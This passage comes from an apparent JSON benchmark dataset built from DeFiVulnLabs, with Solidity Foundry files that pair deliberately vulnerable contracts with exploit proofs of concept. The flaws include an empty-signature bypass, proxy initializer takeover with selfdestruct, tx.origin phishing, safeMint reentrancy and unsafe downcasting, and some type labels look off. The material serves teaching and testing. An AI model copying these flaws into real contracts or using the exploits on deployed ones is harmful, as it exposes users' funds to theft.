    "fix_description": "Avoid any situation that if the numerator is smaller than the denominator, the result will be zero.\nRounding down related issues can be avoided in many ways:\n    1.Using libraries for rounding up/down as expected\n    2.Requiring result is not zero or denominator is <= numerator\n    3.Refactor operations for avoiding first dividing then multiplying, when first dividing then multiplying, precision lost is amplified",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Precision-loss.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_empty-loop",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "empty-loop.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.15;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n/*\nName: Empty loop issue\n\nDescription:\nDue to insufficient validation, an attacker can simply pass an empty array to bypass the loop and signature verification.\n\nMitigation:  \nCheck the number of signatures  \nrequire(sigs.length > 0, \"No signatures provided\");\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1673195574215213057\nhttps://twitter.com/akshaysrivastv/status/1648310441058115592\nhttps://dacian.me/exploiting-developer-assumptions#heading-unexpected-empty-inputs\n*/\ncontract ContractTest is Test {\n    SimpleBank SimpleBankContract;\n\n    function setUp() public {\n        SimpleBankContract = new SimpleBank();\n    }\n\n    function testVulnSignatureValidation() public {\n        payable(address(SimpleBankContract)).transfer(10 ether);\n        address alice = vm.addr(1);\n        vm.startPrank(alice);\n\n        SimpleBank.Signature[] memory sigs = new SimpleBank.Signature[](0); // empty input\n        //sigs[0] = SimpleBank.Signature(\"\", 0, \"\", \"\");\n\n        console.log(\n            \"Before exploiting, Alice's ether balance\",\n            address(alice).balance\n        );\n        SimpleBankContract.withdraw(sigs); // Call the withdraw function of the SimpleBank contract with empty sigs array as the parameter\n\n        console.log(\n            \"Afer exploiting, Alice's ether balance\",\n            address(alice).balance\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract SimpleBank {\n    struct Signature {\n        bytes32 hash;\n        uint8 v;\n        bytes32 r;\n        bytes32 s;\n    }\n\n    function verifySignatures(Signature calldata sig) public {\n        require(\n            msg.sender == ecrecover(sig.hash, sig.v, sig.r, sig.s),\n            \"Invalid signature\"\n        );\n    }\n\n    function withdraw(Signature[] calldata sigs) public {\n        // Mitigation: Check the number of signatures\n        //require(sigs.length > 0, \"No signatures provided\");\n        for (uint i = 0; i < sigs.length; i++) {\n            Signature calldata signature = sigs[i];\n            // Verify every signature and revert if any of them fails to verify.\n            verifySignatures(signature);\n        }\n        payable(msg.sender).transfer(1 ether);\n    }\n\n    receive() external payable {}\n}\n",
    "vulnerable_contract_only": "contract SimpleBank {\n    struct Signature {\n        bytes32 hash;\n        uint8 v;\n        bytes32 r;\n        bytes32 s;\n    }\n\n    function verifySignatures(Signature calldata sig) public {\n        require(\n            msg.sender == ecrecover(sig.hash, sig.v, sig.r, sig.s),\n            \"Invalid signature\"\n        );\n    }\n\n    function withdraw(Signature[] calldata sigs) public {\n        // Mitigation: Check the number of signatures\n        //require(sigs.length > 0, \"No signatures provided\");\n        for (uint i = 0; i < sigs.length; i++) {\n            Signature calldata signature = sigs[i];\n            // Verify every signature and revert if any of them fails to verify.\n            verifySignatures(signature);\n        }\n        payable(msg.sender).transfer(1 ether);\n    }\n\n    receive() external payable {}\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Empty loop issue",
    "description": "Due to insufficient validation, an attacker can simply pass an empty array to bypass the loop and signature verification.",
    "scenario": "",
    "fix_description": "Check the number of signatures  \nrequire(sigs.length > 0, \"No signatures provided\");",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/empty-loop.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_uninitialized_variables",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Uninitialized_variables.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\n\n/*\nName: Uninitialized variable Vulnerability\n\nDescription:\nUninitialized local storage variables may contain the value of other storage variables in the contract; \nthis fact can cause unintentional vulnerabilities, or be exploited deliberately.\n\nREF:\nhttps://blog.dixitaditya.com/ethernaut-level-25-motorbike\n*/\n\ncontract ContractTest is Test {\n    Engine EngineContract;\n    Motorbike MotorbikeContract;\n    Attack AttackContract;\n\n    function testUninitialized() public {\n        EngineContract = new Engine();\n        MotorbikeContract = new Motorbike(address(EngineContract));\n        AttackContract = new Attack();\n\n        // Engine contract is not initialized\n        console.log(\"Unintialized Upgrader:\", EngineContract.upgrader());\n        // Malicious user calls initialize() on Engine contract to become upgrader.\n        address(EngineContract).call(abi.encodeWithSignature(\"initialize()\"));\n        // Malicious user becomes the upgrader\n        console.log(\"Initialized Upgrader:\", EngineContract.upgrader());\n\n        // Upgrade the implementation of the proxy to a malicious contract and call `attack()`\n        bytes memory initEncoded = abi.encodeWithSignature(\"attack()\");\n        address(EngineContract).call(\n            abi.encodeWithSignature(\n                \"upgradeToAndCall(address,bytes)\",\n                address(AttackContract),\n                initEncoded\n            )\n        );\n\n        console.log(\"Exploit completed\");\n        console.log(\"Since EngineContract destroyed, next call will fail.\");\n        address(EngineContract).call(\n            abi.encodeWithSignature(\n                \"upgradeToAndCall(address,bytes)\",\n                address(AttackContract),\n                initEncoded\n            )\n        );\n    }\n}\n\ncontract Motorbike {\n    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 internal constant _IMPLEMENTATION_SLOT =\n        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    struct AddressSlot {\n        address value;\n    }\n\n    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.\n    constructor(address _logic) {\n        require(\n            Address.isContract(_logic),\n            \"ERC1967: new implementation is not a contract\"\n        );\n        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;\n        (bool success, ) = _logic.delegatecall(\n            abi.encodeWithSignature(\"initialize()\")\n        );\n        require(success, \"Call failed\");\n    }\n\n    // Delegates the current call to `implementation`.\n    function _delegate(address implementation) internal virtual {\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            calldatacopy(0, 0, calldatasize())\n            let result := delegatecall(\n                gas(),\n                implementation,\n                0,\n                calldatasize(),\n                0,\n                0\n            )\n            returndatacopy(0, 0, returndatasize())\n            switch result\n            case 0 {\n                revert(0, returndatasize())\n            }\n            default {\n                return(0, returndatasize())\n            }\n        }\n    }\n\n    // Fallback function that delegates calls to the address returned by `_implementation()`.\n    // Will run if no other function in the contract matches the call data\n    fallback() external payable virtual {\n        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);\n    }\n\n    // Returns an `AddressSlot` with member `value` located at `slot`.\n    function _getAddressSlot(\n        bytes32 slot\n    ) internal pure returns (AddressSlot storage r) {\n        assembly {\n            r.slot := slot\n        }\n    }\n}\n\ncontract Engine is Initializable {\n    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 internal constant _IMPLEMENTATION_SLOT =\n        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    address public upgrader;\n    uint256 public horsePower;\n\n    struct AddressSlot {\n        address value;\n    }\n\n    function initialize() external initializer {\n        horsePower = 1000;\n        upgrader = msg.sender;\n    }\n\n    // Upgrade the implementation of the proxy to `newImplementation`\n    // subsequently execute the function call\n    function upgradeToAndCall(\n        address newImplementation,\n        bytes memory data\n    ) external payable {\n        _authorizeUpgrade();\n        _upgradeToAndCall(newImplementation, data);\n    }\n\n    // Restrict to upgrader role\n    function _authorizeUpgrade() internal view {\n        require(msg.sender == upgrader, \"Can't upgrade\");\n    }\n\n    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.\n    function _upgradeToAndCall(\n        address newImplementation,\n        bytes memory data\n    ) internal {\n        // Initial upgrade and setup call\n        _setImplementation(newImplementation);\n        if (data.length > 0) {\n            (bool success, ) = newImplementation.delegatecall(data);\n            require(success, \"Call failed\");\n        }\n    }\n\n    event Returny(uint256);\n\n    function greetMe() public {\n        emit Returny(0x42);\n    }\n\n    // Stores a new address in the EIP1967 implementation slot.\n    function _setImplementation(address newImplementation) private {\n        require(\n            Address.isContract(newImplementation),\n            \"ERC1967: new implementation is not a contract\"\n        );\n\n        AddressSlot storage r;\n        assembly {\n            r.slot := _IMPLEMENTATION_SLOT\n        }\n        r.value = newImplementation;\n    }\n}\n\ncontract Attack {\n    function attack() external {\n        selfdestruct(payable(msg.sender));\n    }\n}\n",
    "vulnerable_contract_only": "contract Motorbike {\n    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 internal constant _IMPLEMENTATION_SLOT =\n        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    struct AddressSlot {\n        address value;\n    }\n\n    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.\n    constructor(address _logic) {\n        require(\n            Address.isContract(_logic),\n            \"ERC1967: new implementation is not a contract\"\n        );\n        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;\n        (bool success, ) = _logic.delegatecall(\n            abi.encodeWithSignature(\"initialize()\")\n        );\n        require(success, \"Call failed\");\n    }\n\n    // Delegates the current call to `implementation`.\n    function _delegate(address implementation) internal virtual {\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            calldatacopy(0, 0, calldatasize())\n            let result := delegatecall(\n                gas(),\n                implementation,\n                0,\n                calldatasize(),\n                0,\n                0\n            )\n            returndatacopy(0, 0, returndatasize())\n            switch result\n            case 0 {\n                revert(0, returndatasize())\n            }\n            default {\n                return(0, returndatasize())\n            }\n        }\n    }\n\n    // Fallback function that delegates calls to the address returned by `_implementation()`.\n    // Will run if no other function in the ",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "Uninitialized variable Vulnerability",
    "description": "Uninitialized local storage variables may contain the value of other storage variables in the contract; \nthis fact can cause unintentional vulnerabilities, or be exploited deliberately.",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Uninitialized_variables.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_unsafe-downcast",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "unsafe-downcast.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n// Import the SafeCast library\nimport \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\n\n/*\nName: Unsafe downcasting\n\nDescription:\nDowncasting from a larger integer type to a smaller one without checks can lead to unexpected behavior \nif the value of the larger integer is outside the range of the smaller one.\n\nMitigation:  \nMake sure consistent uint256, or use openzepplin safeCasting.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1673511868839886849\nhttps://github.com/code-423n4/2022-12-escher-findings/issues/369\nhttps://github.com/sherlock-audit/2022-10-union-finance-judging/issues/96\n*/\n\ncontract ContractTest is Test {\n    SimpleBank SimpleBankContract;\n    FixedSimpleBank FixedSimpleBankContract;\n\n    function setUp() public {\n        SimpleBankContract = new SimpleBank();\n        FixedSimpleBankContract = new FixedSimpleBank();\n    }\n\n    function testUnsafeDowncast() public {\n        SimpleBankContract.deposit(257); //overflowed\n\n        console.log(\n            \"balance of SimpleBankContract:\",\n            SimpleBankContract.getBalance()\n        );\n\n        // balance is 1, because of overflowed\n        assertEq(SimpleBankContract.getBalance(), 1);\n    }\n\n    function testsafeDowncast() public {\n        vm.expectRevert(\"SafeCast: value doesn't fit in 8 bits\");\n        FixedSimpleBankContract.deposit(257); //revert\n    }\n\n    receive() external payable {}\n}\n\ncontract SimpleBank {\n    mapping(address => uint) private balances;\n\n    function deposit(uint256 amount) public {\n        // Here's the unsafe downcast. If the `amount` is greater than type(uint8).max\n        // (which is 255), then only the least significant 8 bits are stored in balance.\n        // This could lead to unexpected results due to overflow.\n        uint8 balance = uint8(amount);\n\n        // store the balance\n        balances[msg.sender] = balance;\n    }\n\n    function getBalance() public view returns (uint) {\n        return balances[msg.sender];\n    }\n}\n\ncontract FixedSimpleBank {\n    using SafeCast for uint256; // Use SafeCast for uint256\n\n    mapping(address => uint) private balances;\n\n    function deposit(uint256 _amount) public {\n        // Use the `toUint8()` function from `SafeCast` to safely downcast `amount`.\n        // If `amount` is greater than `type(uint8).max`, it will revert.\n        // or keep the same uint256 with amount.\n        uint8 amount = _amount.toUint8(); // or keep uint256\n\n        // Store the balance\n        balances[msg.sender] = amount;\n    }\n\n    function getBalance() public view returns (uint) {\n        return balances[msg.sender];\n    }\n}\n",
    "vulnerable_contract_only": "contract SimpleBank {\n    mapping(address => uint) private balances;\n\n    function deposit(uint256 amount) public {\n        // Here's the unsafe downcast. If the `amount` is greater than type(uint8).max\n        // (which is 255), then only the least significant 8 bits are stored in balance.\n        // This could lead to unexpected results due to overflow.\n        uint8 balance = uint8(amount);\n\n        // store the balance\n        balances[msg.sender] = balance;\n    }\n\n    function getBalance() public view returns (uint) {\n        return balances[msg.sender];\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "unchecked_call",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "Unsafe downcasting",
    "description": "Downcasting from a larger integer type to a smaller one without checks can lead to unexpected behavior \nif the value of the larger integer is outside the range of the smaller one.",
    "scenario": "",
    "fix_description": "Make sure consistent uint256, or use openzepplin safeCasting.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": true,
    "context_level": "intra_contract",
    "original_source_path": "src/test/unsafe-downcast.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_struct-deletion",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Struct-deletion.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Struct Deletion Oversight\n\nDescription:\nIncomplete struct deletion leaves residual data. \nIf you delete a struct containing a mapping, the mapping won't be deleted.\n\nThe bug arises because Solidity's delete keyword does not reset the storage to its \ninitial state but rather performs a partial reset. \nWhen delete  myStructs[structId] is called, \nit only resets the id at mappingId to its default value 0, \nbut the other flags in the mapping remain unchanged. Therefore,\nif the struct is deleted without deleting the mapping inside, \nthe remaining flags will persist in storage.\n\nMitigation:  \nTo fix this bug, you should delete the mapping inside the struct before deleting the struct itself.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1676836264245592065\nhttps://docs.soliditylang.org/en/develop/types.html\n*/\n\ncontract ContractTest is Test {\n    StructDeletionBug StructDeletionBugContract;\n    FixedStructDeletion FixedStructDeletionContract;\n\n    function setUp() public {\n        StructDeletionBugContract = new StructDeletionBug();\n        FixedStructDeletionContract = new FixedStructDeletion();\n    }\n\n    function testStructDeletion() public {\n        StructDeletionBugContract.addStruct(10, 10);\n        StructDeletionBugContract.getStruct(10, 10);\n        StructDeletionBugContract.deleteStruct(10);\n        StructDeletionBugContract.getStruct(10, 10);\n    }\n\n    function testFixedStructDeletion() public {\n        FixedStructDeletionContract.addStruct(10, 10);\n        FixedStructDeletionContract.getStruct(10, 10);\n        FixedStructDeletionContract.deleteStruct(10);\n        FixedStructDeletionContract.getStruct(10, 10);\n    }\n\n    receive() external payable {}\n}\n\ncontract StructDeletionBug {\n    struct MyStruct {\n        uint256 id;\n        mapping(uint256 => bool) flags;\n    }\n\n    mapping(uint256 => MyStruct) public myStructs;\n\n    function addStruct(uint256 structId, uint256 flagKeys) public {\n        MyStruct storage newStruct = myStructs[structId];\n        newStruct.id = structId;\n        newStruct.flags[flagKeys] = true;\n    }\n\n    function getStruct(\n        uint256 structId,\n        uint256 flagKeys\n    ) public view returns (uint256, bool) {\n        MyStruct storage myStruct = myStructs[structId];\n        bool keys = myStruct.flags[flagKeys];\n        return (myStruct.id, keys);\n    }\n\n    function deleteStruct(uint256 structId) public {\n        MyStruct storage myStruct = myStructs[structId];\n        delete myStructs[structId];\n    }\n}\n\ncontract FixedStructDeletion {\n    struct MyStruct {\n        uint256 id;\n        mapping(uint256 => bool) flags;\n    }\n\n    mapping(uint256 => MyStruct) public myStructs;\n\n    function addStruct(uint256 structId, uint256 flagKeys) public {\n        MyStruct storage newStruct = myStructs[structId];\n        newStruct.id = structId;\n        newStruct.flags[flagKeys] = true;\n    }\n\n    function getStruct(\n        uint256 structId,\n        uint256 flagKeys\n    ) public view returns (uint256, bool) {\n        MyStruct storage myStruct = myStructs[structId];\n        bool keys = myStruct.flags[flagKeys];\n        return (myStruct.id, keys);\n    }\n\n    function deleteStruct(uint256 structId) public {\n        MyStruct storage myStruct = myStructs[structId];\n        // Check if all flags are deleted, then delete the mapping\n        for (uint256 i = 0; i < 15; i++) {\n            delete myStruct.flags[i];\n        }\n        delete myStructs[structId];\n    }\n}\n",
    "vulnerable_contract_only": "contract StructDeletionBug {\n    struct MyStruct {\n        uint256 id;\n        mapping(uint256 => bool) flags;\n    }\n\n    mapping(uint256 => MyStruct) public myStructs;\n\n    function addStruct(uint256 structId, uint256 flagKeys) public {\n        MyStruct storage newStruct = myStructs[structId];\n        newStruct.id = structId;\n        newStruct.flags[flagKeys] = true;\n    }\n\n    function getStruct(\n        uint256 structId,\n        uint256 flagKeys\n    ) public view returns (uint256, bool) {\n        MyStruct storage myStruct = myStructs[structId];\n        bool keys = myStruct.flags[flagKeys];\n        return (myStruct.id, keys);\n    }\n\n    function deleteStruct(uint256 structId) public {\n        MyStruct storage myStruct = myStructs[structId];\n        delete myStructs[structId];\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "Struct Deletion Oversight",
    "description": "Incomplete struct deletion leaves residual data. \nIf you delete a struct containing a mapping, the mapping won't be deleted.\n\nThe bug arises because Solidity's delete keyword does not reset the storage to its \ninitial state but rather performs a partial reset. \nWhen delete  myStructs[structId] is called, \nit only resets the id at mappingId to its default value 0, \nbut the other flags in the mapping remain unchanged. Therefore,\nif the struct is deleted without deleting the mapping inside, \nthe remaining flags will persist in storage.",
    "scenario": "",
    "fix_description": "To fix this bug, you should delete the mapping inside the struct before deleting the struct itself.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": true,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Struct-deletion.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_txorigin",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "txorigin.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.15;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Insecure tx.origin Vulnerability\n\nDescription:\ntx.origin is a global variable in Solidity; using this variable for authentication in \na smart contract makes the contract vulnerable to phishing attacks.\n\nScenario:\nWallet is a simple contract where only the owner should be able to transfer\nEther to another address. Wallet.transfer() uses tx.origin to check that the\ncaller is the owner. Let's see how we can hack this contract\n\nWhat happened?\nAlice was tricked into calling Attack.attack(). Inside Attack.attack(), it\nrequested a transfer of all funds in Alice's wallet to Eve's address.\nSince tx.origin in Wallet.transfer() is equal to Alice's address,\nit authorized the transfer. The wallet transferred all Ether to Eve.\n\nMitigation:\nIt is advisable to use msg.sender.\n\nREF:\nhttps://hackernoon.com/hacking-solidity-contracts-using-txorigin-for-authorization-are-vulnerable-to-phishing\n*/\n\ncontract ContractTest is Test {\n    Wallet WalletContract;\n    Attack AttackerContract;\n\n    function testtxorigin() public {\n        address alice = vm.addr(1);\n        address eve = vm.addr(2);\n        vm.deal(address(alice), 10 ether);\n        vm.deal(address(eve), 1 ether);\n        vm.prank(alice);\n        WalletContract = new Wallet{value: 10 ether}(); //Alice deploys Wallet with 10 Ether\n        console.log(\"Owner of wallet contract\", WalletContract.owner());\n        vm.prank(eve);\n        AttackerContract = new Attack(WalletContract); //Eve deploys Attack with the address of Alice's Wallet contract.\n        console.log(\"Owner of attack contract\", AttackerContract.owner());\n        console.log(\"Eve of balance\", address(eve).balance);\n\n        vm.prank(alice, alice);\n        AttackerContract.attack(); // Eve tricks Alice to call AttackerContract.attack()\n        console.log(\"tx origin address\", tx.origin);\n        console.log(\"msg.sender address\", msg.sender);\n        console.log(\"Eve of balance\", address(eve).balance);\n    }\n\n    receive() external payable {}\n}\n\ncontract Wallet {\n    address public owner;\n\n    constructor() payable {\n        owner = msg.sender;\n    }\n\n    function transfer(address payable _to, uint _amount) public {\n        // check with msg.sender instead of tx.origin\n        require(tx.origin == owner, \"Not owner\");\n\n        (bool sent, ) = _to.call{value: _amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract Attack {\n    address payable public owner;\n    Wallet wallet;\n\n    constructor(Wallet _wallet) {\n        wallet = Wallet(_wallet);\n        owner = payable(msg.sender);\n    }\n\n    function attack() public {\n        wallet.transfer(owner, address(wallet).balance);\n    }\n}\n",
    "vulnerable_contract_only": "contract Wallet {\n    address public owner;\n\n    constructor() payable {\n        owner = msg.sender;\n    }\n\n    function transfer(address payable _to, uint _amount) public {\n        // check with msg.sender instead of tx.origin\n        require(tx.origin == owner, \"Not owner\");\n\n        (bool sent, ) = _to.call{value: _amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "tx_origin_auth",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Insecure tx.origin Vulnerability",
    "description": "tx.origin is a global variable in Solidity; using this variable for authentication in \na smart contract makes the contract vulnerable to phishing attacks.",
    "scenario": "Wallet is a simple contract where only the owner should be able to transfer\nEther to another address. Wallet.transfer() uses tx.origin to check that the\ncaller is the owner. Let's see how we can hack this contract\n\nWhat happened?\nAlice was tricked into calling Attack.attack(). Inside Attack.attack(), it\nrequested a transfer of all funds in Alice's wallet to Eve's address.\nSince tx.origin in Wallet.transfer() is equal to Alice's address,\nit authorized the transfer. The wallet transferred all Ether to Eve.",
    "fix_description": "It is advisable to use msg.sender.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/txorigin.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_unprotected-callback",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Unprotected-callback.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol\";\n\n/*\nName: Unprotected callback - ERC721 SafeMint reentrancy\n\nDescription:\nThe contract ContractTest is exploiting a callback feature to bypass the maximum mint limit \nset by the MaxMint721 contract. This is achieved by triggering the onERC721Received function,\nwhich internally calls the mint function again. Therefore, although MaxMint721 attempts \nto limit the number of tokens that a user can mint to MAX_PER_USER, the ContractTest contract \nsuccessfully mints more tokens than this limit. \n\nScenario:\nThis excersise is about a contract that via callback function to mint more NFTs\n\nMitigation:\nFollow check-effect-interaction and use OpenZeppelin Reentrancy Guard.\n\nREF\nhttps://blocksecteam.medium.com/when-safemint-becomes-unsafe-lessons-from-the-hypebears-security-incident-2965209bda2a\nhttps://www.paradigm.xyz/2021/08/the-dangers-of-surprising-code\n\n*/\n\ncontract ContractTest is Test {\n    MaxMint721 MaxMint721Contract;\n    bool complete;\n    uint256 maxMints = 10;\n    address alice = vm.addr(1);\n    address eve = vm.addr(2);\n\n    function testSafeMint() public {\n        MaxMint721Contract = new MaxMint721();\n        MaxMint721Contract.mint(maxMints);\n        console.log(\"Bypassed maxMints, we got 19 NFTs\");\n        assertEq(MaxMint721Contract.balanceOf(address(this)), 19);\n        console.log(\"NFT minted:\", MaxMint721Contract.balanceOf(address(this)));\n    }\n\n    function onERC721Received(\n        address,\n        address,\n        uint256,\n        bytes memory\n    ) public returns (bytes4) {\n        if (!complete) {\n            complete = true;\n            MaxMint721Contract.mint(maxMints - 1);\n            console.log(\"Called with :\", maxMints - 1);\n        }\n        return this.onERC721Received.selector;\n    }\n\n    receive() external payable {}\n}\n\ncontract MaxMint721 is ERC721Enumerable {\n    uint256 public MAX_PER_USER = 10;\n\n    constructor() ERC721(\"ERC721\", \"ERC721\") {}\n\n    function mint(uint256 amount) external {\n        require(\n            balanceOf(msg.sender) + amount <= MAX_PER_USER,\n            \"exceed max per user\"\n        );\n        for (uint256 i = 0; i < amount; i++) {\n            uint256 mintIndex = totalSupply();\n            _safeMint(msg.sender, mintIndex);\n        }\n    }\n}\n",
    "vulnerable_contract_only": "contract MaxMint721 {\n    uint256 public MAX_PER_USER = 10;\n\n    constructor() ERC721(\"ERC721\", \"ERC721\") {}\n\n    function mint(uint256 amount) external {\n        require(\n            balanceOf(msg.sender) + amount <= MAX_PER_USER,\n            \"exceed max per user\"\n        );\n        for (uint256 i = 0; i < amount; i++) {\n            uint256 mintIndex = totalSupply();\n            _safeMint(msg.sender, mintIndex);\n        }\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "unprotected_callback",
    "severity": "high",
    "difficulty_tier": 3,
    "vulnerability_name": "Unprotected callback - ERC721 SafeMint reentrancy",
    "description": "The contract ContractTest is exploiting a callback feature to bypass the maximum mint limit \nset by the MaxMint721 contract. This is achieved by triggering the onERC721Received function,\nwhich internally calls the mint function again. Therefore, although MaxMint721 attempts \nto limit the number of tokens that a user can mint to MAX_PER_USER, the ContractTest contract \nsuccessfully mints more tokens than this limit.",
    "scenario": "This excersise is about a contract that via callback function to mint more NFTs",
    "fix_description": "Follow check-effect-interaction and use OpenZeppelin Reentrancy Guard.",
    "references": [
      "https://blocksecteam.medium.com/when-safemint-becomes-unsafe-lessons-from-the-hypebears-security-incident-2965209bda2a"
    ],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Unprotected-callback.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_payable-transfer",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "payable-transfer.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Incorrect use of payable.transfer()\n\nDescription:\nAfter the implementation of EIP 1884 in the Istanbul hard fork, \nthe gas cost of the SLOAD operation was increased, \nresulting in the breaking of some existing smart contracts.\n\nWhen transferring ETH to recipients, if Solidity's transfer() or send() method \nis used, certain shortcomings arise, particularly when the recipient \nis a smart contract. These shortcomings can make it impossible to \nsuccessfully transfer ETH to the smart contract recipient.\n\nSpecifically, the transfer will inevitably fail when the smart contract:\n    1.does not implement a payable fallback function, or\n    2.implements a payable fallback function which would incur more than 2300 gas units, or\n    3.implements a payable fallback function incurring less than 2300 gas units but is called through a proxy that raises the call\u2019s gas usage above 2300.\n\nMitigation:  \nUsing call with its returned boolean checked in combination with re-entrancy guard is highly recommended.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1678958093273829376\nhttps://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/\nhttps://github.com/code-423n4/2022-12-escher-findings/issues/99\n*/\n\ncontract ContractTest is Test {\n    SimpleBank SimpleBankContract;\n    FixedSimpleBank FixedSimpleBankContract;\n\n    function setUp() public {\n        SimpleBankContract = new SimpleBank();\n        FixedSimpleBankContract = new FixedSimpleBank();\n    }\n\n    function testTransferFail() public {\n        SimpleBankContract.deposit{value: 1 ether}();\n        assertEq(SimpleBankContract.getBalance(), 1 ether);\n        vm.expectRevert();\n        SimpleBankContract.withdraw(1 ether);\n    }\n\n    function testCall() public {\n        FixedSimpleBankContract.deposit{value: 1 ether}();\n        assertEq(FixedSimpleBankContract.getBalance(), 1 ether);\n        FixedSimpleBankContract.withdraw(1 ether);\n    }\n\n    receive() external payable {\n        //just a example for out of gas\n        SimpleBankContract.deposit{value: 1 ether}();\n    }\n}\n\ncontract SimpleBank {\n    mapping(address => uint) private balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function getBalance() public view returns (uint) {\n        return balances[msg.sender];\n    }\n\n    function withdraw(uint amount) public {\n        require(balances[msg.sender] >= amount);\n        balances[msg.sender] -= amount;\n        // the issue is here\n        payable(msg.sender).transfer(amount);\n    }\n}\n\ncontract FixedSimpleBank {\n    mapping(address => uint) private balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function getBalance() public view returns (uint) {\n        return balances[msg.sender];\n    }\n\n    function withdraw(uint amount) public {\n        require(balances[msg.sender] >= amount);\n        balances[msg.sender] -= amount;\n        (bool success, ) = payable(msg.sender).call{value: amount}(\"\");\n        require(success, \" Transfer of ETH Failed\");\n    }\n}\n",
